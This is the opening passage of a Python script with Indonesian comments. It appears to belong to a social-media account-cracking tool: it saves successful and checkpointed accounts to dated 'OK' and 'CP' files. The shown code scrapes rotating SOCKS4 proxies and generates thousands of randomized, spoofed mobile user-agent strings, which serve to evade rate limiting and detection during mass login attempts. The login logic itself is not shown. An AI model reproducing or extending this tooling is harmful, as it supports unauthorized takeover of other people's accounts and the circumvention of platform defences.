Meledak=[]
Cik=[]
# ---------------- [ INSTALASI IMPORT ] -:--------------- #

from enum import auto
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
import inquirer,subprocess

# ---------------- [ INSTALASI FROM IMPORT ] ------------------ #

from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn, SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol,Console
from bs4 import BeautifulSoup as sop, BeautifulSoup
from rich.table import Table as me
from rich.columns import Columns as col, Columns
from inquirer.themes import Default
from pyfiglet import Figlet

# --------------- [ INSTALASI RICH PANEL ] ----------------- #

from time import time as CikKawan
from rich.panel import Panel as nel, Panel
from rich import print as prints
from rich.tree import Tree
from rich import pretty

###----------[ WARNA PRINT RICH ]---------- ###

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
console = sol()

# ------------- [ MENENTUKAN TANGGAL ] -------------- #

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
tgl = datetime.datetime.now().day
skrng = datetime.datetime.now()
tahun, bulan, hari = skrng.year, skrng.month, skrng.day
tanggal = ("%s-%s-%s"%(hari,bulan_cek[bulan-1],tahun))
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# ---------------- [ METHODE PENGUNCI ] ------------------ #

loop=0
ok=0
cp=0
akun=[]
oprek=[]
method=[]
tokenku=[]
uid=[]
pwnya=[]
pwpluss=[]
cokbrut=[]
id = []
id2 = []
pretty.install()
CON=sol()
console=sol()
dump=[]
cokbrut=[]
xyz = requests.Session()
ses=requests.Session()
princp=[]
Merasa_udh_jagoan=[]
rr = random.randint
rc = random.choice

###----------[ GET PROXY ]----------###

prox = open(".prox.txt", "r").read().splitlines()
try:
    prox = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all").text
    open(".prox.txt", "w").write(prox)
except Exception as e:
    Console().print(f" {H2}•{P2} Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda")
    exit()
    
###----------[ USER AGENT 1 ]----------###
ugen = []

for t in range(10000):
	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
	udin=random.choice(['R111-','R108-','R110-','R109-'])
	susu=random.choice(['Samsung Chromebook Plus (V2)'])
	dn=random.randrange(50,100)
	b=random.randrange(111111,210000)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	udinsad1=f'Mozilla/5.0 (Linux; Android {a}; SM-G531H Build/RKQ1.{b}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad2=f'Mozilla/5.0 (Linux; Android {a}; SM-J610G Build/PPR1.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 HeyTapBrowser/40.8.8.9'
	udinsad3=f'Mozilla/5.0 (Linux; Android {a}; SM-A405FN Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad4=f'Mozilla/5.0 (Linux; Android {a}; SM-X11O Build/SP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad5=f'Mozilla/5.0 (Linux; U; Android {a}; Mi A3 Build/QKQ1.{b}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/52.0.2254.54030'
	udinsad6=f'Mozilla/5.0 (Linux; Android {a}; GLi Lite Build/PPR1.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad7=f'Mozilla/5.0 (Linux; Android {a}; {susu} Build/{udin}15329.{dn}.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Safari/537.36'
	udinsad8=f'Mozilla/5.0 (Linux; U; Android {a}; V2029 Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/52.2.2254.54723'
	udinsad9=f'Mozilla/5.0 (Linux; U; Android {a}; Mi A2 Build/QKQ1.{b}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/52.0.2254.54030'
	udinsad10=f'Mozilla/5.0 (Linux; U; Android {a}; RMX2020 Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/51.0.2254.150807'
	udinsad11=f'Mozilla/5.0 (Linux; Android {a}; RMX2001 Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad12=f'Mozilla/5.0 (Linux; Android {a}; RMX1941 Build/PPR1.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/280.0.0.48.122;]'
	udinsad13=f'Mozilla/5.0 (Linux; Android {a}; RMX1825 Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad14=f'Mozilla/5.0 (Linux; U; Android {a}; SM-A505F Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/52.2.2254.54723'
	udinsad15=f'Mozilla/5.0 (Linux; U; Android {a}; SM-A205F Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 OPR/52.2.2254.54723'
	udinsad16=f'Mozilla/5.0 (Linux; Android {a}; SM-M136B Build/SP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad17=f'Mozilla/5.0 (Linux; Android {a}; SM-M317F Build/SP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad18=f'Mozilla/5.0 (Linux; Android {a}; SM-M326B Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad19=f'Mozilla/5.0 (Linux; Android {a}; SM-N986U Build/TP1A.{b}.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	udinsad20=f'Mozilla/5.0 (Linux; Android {a}; SM-N986B Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	uaku2 = random.choice([udinsad1,udinsad2,udinsad3,udinsad4,udinsad5,udinsad6,udinsad7,udinsad8,udinsad9,udinsad10,udinsad11,udinsad12,udinsad13,udinsad14,udinsad15,udinsad16,udinsad17,udinsad18,udinsad19,udinsad20])
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPH1837)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
    
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Oppo A4 Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 10'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Mi 9T Pro Build/QKQ1.190825.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH1931 Build/QKQ1.200209.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; U; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ru-ru; Redmi 4A Build/N2G47H)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-N920)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (X11'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Linux x86_64)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Samsung Galaxy Note 9 Build/SM-N960N)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1. 15 (KHTML, like Gecko) Version/5.2 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/604.1.'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['M2012K11AG Build/L120G)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)86.0.4529.132 Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['MITO A75)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/11.4.8.1012 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG SM-F900U Build/PPR1.180610.011'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)#ffffff
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; U; Android;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; Redmi 5 Plus Build/OPM1.171019.019'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/13.4.0.1306 Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi Note 9 Pro)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ASUS_Z01QD)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi 4A Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Lenovo TB-X606X)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 OPR/68.3.3557.64528'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH2349) AppleWebKit/537.36'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='(KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X682C)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
